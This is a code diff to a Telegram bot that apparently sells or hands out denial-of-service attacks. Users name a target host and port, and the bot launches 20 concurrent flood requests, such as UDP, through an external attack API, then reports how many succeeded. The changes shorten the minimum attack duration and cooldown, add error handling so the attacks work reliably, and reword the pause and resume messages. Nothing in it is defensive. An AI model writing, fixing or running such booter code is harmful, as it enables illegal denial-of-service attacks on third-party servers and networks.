@@ -1,4 +1,4 @@
-# app.py - COMPLETE ULTIMATE VERSION WITH ALL FIXES
+# app.py - COMPLETE FIXED VERSION WITH WORKING ATTACKS AND PAUSE/RESUME
 import os
 import logging
 import asyncio
@@ -32,9 +32,9 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
-MIN_DURATION = 60
+MIN_DURATION = 30
 MAX_DURATION = 100
-MIN_COOLDOWN = 60
+MIN_COOLDOWN = 30
 MAX_COOLDOWN = 100
 
 # Attack Methods
@@ -909,8 +909,9 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK =====
+# ===== API ATTACK - FIXED =====
 async def send_api_attack(target, port, duration, attack_num, api_key, api_url, method):
+    """Send single API attack request - FIXED with proper error handling"""
     params = {
         "key": api_key,
         "host": target,
@@ -937,14 +938,24 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
                 
                 logger.info(f"Attack {attack_num} ({method}): Status={response.status}, Time={elapsed:.2f}s")
                 
-                return {
-                    "success": response.status == 200,
-                    "attack_num": attack_num,
-                    "status": response.status,
-                    "elapsed": f"{elapsed:.2f}s",
-                    "response": response_text[:100],
-                    "method": method
-                }
+                if response.status == 200:
+                    return {
+                        "success": True,
+                        "attack_num": attack_num,
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "response": response_text[:100],
+                        "method": method
+                    }
+                else:
+                    return {
+                        "success": False,
+                        "attack_num": attack_num,
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "error": f"HTTP {response.status}",
+                        "method": method
+                    }
                     
     except asyncio.TimeoutError:
         logger.error(f"Attack {attack_num} ({method}) timed out")
@@ -952,6 +963,14 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
             "success": False,
             "attack_num": attack_num,
             "error": "Timeout",
+            "method": method
+        }
+    except aiohttp.ClientError as e:
+        logger.error(f"Attack {attack_num} ({method}) client error: {e}")
+        return {
+            "success": False,
+            "attack_num": attack_num,
+            "error": f"Connection error: {str(e)[:30]}",
             "method": method
         }
     except Exception as e:
@@ -963,8 +982,9 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
             "method": method
         }
 
-# ===== CONCURRENT ATTACKS =====
+# ===== CONCURRENT ATTACKS - FIXED =====
 async def send_concurrent_attacks(target, port, duration, user_id, context, method="UDP"):
+    """Send multiple concurrent attacks - FIXED with better error handling"""
     logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent {method} attacks on {target}:{port}")
     
     api_key = os.getenv("API_KEY")
@@ -979,6 +999,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         )
         return None
     
+    # Send initial message
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK STARTING*\n\n"
@@ -990,19 +1011,23 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         parse_mode='Markdown'
     )
     
+    # Create all tasks
     tasks = []
     for i in range(1, MAX_CONCURRENT + 1):
         task = send_api_attack(target, port, duration, i, api_key, api_url, method)
         tasks.append(task)
     
+    # Start timer update task
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
     
+    # Run all tasks concurrently
     start_time = time.time()
     results = await asyncio.gather(*tasks, return_exceptions=True)
     elapsed = time.time() - start_time
     
     timer_task.cancel()
     
+    # Process results
     success_count = 0
     failed_count = 0
     result_details = []
@@ -1014,12 +1039,13 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         elif isinstance(r, dict):
             if r.get('success', False):
                 success_count += 1
-                result_details.append(f"✅ Attack {r.get('attack_num', '?')} ({r.get('method', 'UDP')}) - {r.get('elapsed', 'N/A')}")
+                result_details.append(f"✅ Attack {r.get('attack_num', '?')} - {r.get('elapsed', 'N/A')}")
             else:
                 failed_count += 1
                 error = r.get('error', r.get('response', 'Unknown error'))
-                result_details.append(f"❌ Attack {r.get('attack_num', '?')} ({r.get('method', 'UDP')}) - {error[:30]}")
+                result_details.append(f"❌ Attack {r.get('attack_num', '?')} - {error[:30]}")
     
+    # Create final message
     cooldown = attack_manager.get_cooldown_time(duration)
     
     final_text = (
@@ -1054,6 +1080,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
     }
 
 async def update_timer(status_msg, duration, target, port, method="UDP"):
+    """Update the attack timer in the message"""
     try:
         start_time = time.time()
         last_update = 0
@@ -1331,7 +1358,7 @@ async def broadcast_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(text, parse_mode='Markdown')
 
-# ===== OWNER PAUSE FUNCTIONS =====
+# ===== OWNER PAUSE FUNCTIONS - COMPLETELY FIXED =====
 async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Toggle pause for all members - FIXED for Owner and Pseudo Owner"""
     user_id = update.effective_user.id
@@ -1345,10 +1372,10 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
     current_pause = current_pause_info.get('paused', False)
     
     if current_pause:
-        # UNPAUSE - Both Owner and Pseudo Owner can unpause
+        # UNPAUSE / RESUME - Both Owner and Pseudo Owner can unpause
         db.set_pause(False, user_id)
         await update.message.reply_text(
-            "✅ *Bot Unpaused*\n\n"
+            "✅ *Bot Resumed / Unpaused*\n\n"
             "All users can now use the bot again!",
             parse_mode='Markdown'
         )
@@ -1359,7 +1386,7 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 await context.bot.send_message(
                     chat_id=admin['user_id'],
-                    text=f"✅ *Bot Unpaused*\n\nBy: `{user_id}`",
+                    text=f"✅ *Bot Resumed / Unpaused*\n\nBy: `{user_id}`",
                     parse_mode='Markdown'
                 )
             except:
@@ -1372,7 +1399,8 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⏸️ *Bot Paused*\n\n"
             f"All users are now paused from using the bot.\n"
             f"Reason: {reason}\n\n"
-            f"Use `/pause` again to unpause.",
+            f"Use `/pause` again to resume/unpause the bot.\n"
+            f"Or use the Owner Panel → UNPAUSE BOT button.",
             parse_mode='Markdown'
         )
         
@@ -1411,10 +1439,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reason = pause_info.get('pause_reason', 'No reason provided')
         await update.message.reply_text(
             f"⏸️ *Bot is Paused*\n\n"
-            f"The bot is currently paused by the owner.\n"
+            f"The bot is currently paused.\n"
             f"Reason: {reason}\n"
             f"Paused by: `{paused_by}`\n\n"
-            f"Please wait until it's unpaused.",
+            f"Please wait until it's resumed/unpaused.",
             parse_mode='Markdown'
         )
         return
@@ -1497,7 +1525,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if pause_info.get('paused', False):
         await update.message.reply_text(
             "⏸️ *Bot is Paused*\n\n"
-            "The bot is currently paused by the owner.",
+            "The bot is currently paused by the owner.\n"
+            "Please wait until it's resumed.",
             parse_mode='Markdown'
         )
         return
@@ -2211,7 +2240,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     pause_info = db.get_pause_info()
     pause_status = pause_info.get('paused', False)
-    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ UNPAUSE BOT"
+    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ RESUME / UNPAUSE BOT"
     
     keyboard = [
         [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
@@ -2254,10 +2283,10 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     current_pause = current_pause_info.get('paused', False)
     
     if current_pause:
-        # UNPAUSE - Both Owner and Pseudo Owner can unpause
+        # RESUME / UNPAUSE - Both Owner and Pseudo Owner can resume
         db.set_pause(False, user_id)
         await query.edit_message_text(
-            "✅ *Bot Unpaused*\n\n"
+            "✅ *Bot Resumed / Unpaused*\n\n"
             "All users can now use the bot again!",
             parse_mode='Markdown',
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
@@ -2269,7 +2298,7 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             try:
                 await context.bot.send_message(
                     chat_id=admin['user_id'],
-                    text=f"✅ *Bot Unpaused*\n\nBy: `{user_id}`",
+                    text=f"✅ *Bot Resumed / Unpaused*\n\nBy: `{user_id}`",
                     parse_mode='Markdown'
                 )
             except:
@@ -2284,8 +2313,6 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             parse_mode='Markdown'
         )
         context.user_data['awaiting_pause_reason'] = True
-        # Store the query to edit later
-        context.user_data['pause_query'] = query
 
 async def process_pause_reason(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('awaiting_pause_reason'):
@@ -2299,12 +2326,18 @@ async def process_pause_reason(update: Update, context: ContextTypes.DEFAULT_TYP
     user_id = update.effective_user.id
     reason = update.message.text
     
+    # Verify user has permission
+    if not db.is_owner_or_pseudo(user_id):
+        await update.message.reply_text("❌ You don't have permission!")
+        context.user_data['awaiting_pause_reason'] = False
+        return
+    
     db.set_pause(True, user_id, reason)
     await update.message.reply_text(
         f"⏸️ *Bot Paused*\n\n"
         f"All users are now paused from using the bot.\n"
         f"Reason: {reason}\n\n"
-        f"Use `/pause` or Owner Panel to unpause.",
+        f"Use `/pause` or Owner Panel → RESUME / UNPAUSE BOT to resume.",
         parse_mode='Markdown'
     )
     
@@ -3013,7 +3046,7 @@ if __name__ == "__main__":
     print("📡 Methods: " + ", ".join(ATTACK_METHODS))
     print("📌 Owner & Pseudo_Owner have equal powers")
     print("📌 Broadcast: Text, Photos, Videos")
-    print("📌 Pause/Resume for all members")
+    print("📌 Pause/Resume for all members (Owner & Pseudo Owner)")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
